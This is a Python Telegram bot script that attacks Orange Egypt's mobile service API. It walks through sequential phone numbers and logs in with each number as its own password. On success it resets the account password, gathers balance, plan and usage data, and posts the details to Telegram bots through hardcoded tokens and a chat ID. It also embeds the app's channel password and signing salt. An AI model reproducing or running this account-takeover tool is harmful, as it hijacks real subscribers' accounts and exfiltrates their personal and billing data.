import telebot,requests,time,os,random
from hashlib import sha256
token = "5455234830:AAE3rRVQoznhgL_83XFhvhXRr9lRmZ3A9Zk"
bot = telebot.TeleBot(token)
@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id,f"<strong>Hello {message.from_user.first_name},\n=== === ===\nWellcome Back Sir...!❤️\n</strong>",parse_mode="html")
@bot.message_handler(func=lambda m:True)
def ps(message):
  msg=message.text
  x = int(msg)
  while True:
    x = x + 1
    number='0'+ str(x)
    z = ("11223344","002255","zzaaqq","159357")
    password= random.choice(z)
    hd = {'Content-type':'application/json','Accept':'application/json','User-Agent':'okhttp/3.12.0','Host':'services.orange.eg','Accept-Encoding':'gzip'}
    url = "https://services.orange.eg/SignIn.svc/SignInUser"
    data = '{"appVersion":"2.9.8","channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","password":"%s","isAndroid":"true"}' % (number, number)
    r = requests.post(url,headers=hd,data=data).json()
    ErrorDescription = r["SignInUserResult"]["ErrorDescription"]
    if "Success" in ErrorDescription :
      user = r["SignInUserResult"]['UserData']['UserID']
      url2 = "https://services.orange.eg/GetToken.svc/GenerateToken"
      hd2 = {  "Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
      data2 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
      ctv = requests.post(url2,headers=hd2,data = data2).json()["GenerateTokenResult"]["Token"]
      a=ctv+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
      htv=(sha256(a.encode('utf-8')).hexdigest().upper())
      #-----------------------------------------
      url3 = "https://services.orange.eg/ProfileService.svc/ChangePassword"
      hd3 = {"_ctv": ctv,"_htv": htv,"Content-Type": "application/json; charset=UTF-8","Content-Length": "190","Host": "services.orange.eg","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
      data3 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"dialNumber":"%s","newPassword":"%s","oldPassword":"%s"}' %(number,password,number)
      r3 = requests.post(url3,headers=hd3,data=data3).text
      print(r3)
      #-----------------------------------------
      url4 = "https://services.orange.eg/GetToken.svc/GenerateToken"
      hd4 = {  "Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
      data4 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
      ctv2 = requests.post(url4,headers=hd4,data = data4).json()["GenerateTokenResult"]["Token"]
      a2=ctv2+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
      htv2=(sha256(a2.encode('utf-8')).hexdigest().upper())
      #------------------------------------------
      hd5 = {"_ctv": ctv2,"_htv": htv2,"isEasyLogin": "false","OsVersion":"Android8.0.0","AppVersion":"601","IsAndroid":"true","Content-Type": "application/json; charset=UTF-8","Content-Length": "190","Host": "backend.orange.eg","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
      url5 = "https://backend.orange.eg/api/V2/Account/GetDialInfo"
      data5 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"CurrentVersion":"580","dial":"%s","isCoin":true,"lang":"ar","isEasyLogin":false,"password":"%s"}' %(number,password)
      r5 = requests.post(url5,headers=hd5,data=data5).json()
      Balance = r5['Balance']
      PlanName = r5['PlanName']
      if "ستار" in PlanName:
        ExpiryDate=r5['ExpiryDate']
        url8 = "https://services.orange.eg/GetToken.svc/GenerateToken"
        hd8 = {"Content-Type":"application/json; charset=UTF-8", "Content-Length":"78" , "Host":"services.orange.eg", "Connection":"Keep-Alive" ,"User-Agent":"okhttp/3.12.1"}
        data8 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"}}'
        ctv4 = requests.post(url8,headers=hd8,data = data8).json()["GenerateTokenResult"]["Token"]
        a4=ctv4+',{.c][o^uecnlkijh*.iomv:QzCFRcd;drof/zx}w;ls.e85T^#ASwa?=(lk'
        htv4=(sha256(a4.encode('utf-8')).hexdigest().upper())
        hd9 = {"_ctv": ctv4,"_htv": htv4,"isEasyLogin": "false","Content-Type": "application/json; charset=UTF-8","Content-Length": "190","Host": "services.orange.eg","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
        url9 = "https://backend.orange.eg/api/Dashboard/GetInternetConsumption"
        data9 = '{"channel":{"ChannelName":"MobinilAndMe","Password":"ig3yh*mk5l42@oj7QAR8yF"},"Dial":"%s","IsEasyLogin":false,"Lang":"ar","Password":"%s"}' %(number,password)
        r9 = requests.post(url9,headers=hd9,data=data9).json()
        msg = ("Number: "+number+"\n"+"Password: "+password+"\n"+"PlanName: "+str(PlanName)+"\n"+"ExpiryDate: "+str(ExpiryDate)+"\n"+"Balance: "+str(Balance)+"\n"+str(r9))
        print(msg)
        tele = f"https://api.telegram.org/bot5586148435:AAGkrrpK5N_M4f82gnHznRp0TDeXzaX90gs/sendMessage?chat_id=1782571717&text={msg}"
        send = requests.post(tele)
      else:
        bot.send_message(message.chat.id,f"<strong>New Account my orange🍊 .....!\n- - - - - - - - - - - - - - - - -\n>>>Number : {number}\n>>>Password : {password}\n>>>Plan : {PlanName}\n>>>Balance : {Balance}\n- - - - - - - - - - - - - - - - -\n>>></strong>",parse_mode="html")
      #------------------------------------------
    else :
      msga = ("Wrong Number "+str(x))
      tele = f"https://api.telegram.org/bot5588346142:AAFrGvXsLYMHOZ1sgWMP4B04Jus8eQyDtS0/sendMessage?chat_id=1782571717&text={msga}"
      send = requests.post(tele)
bot.polling()
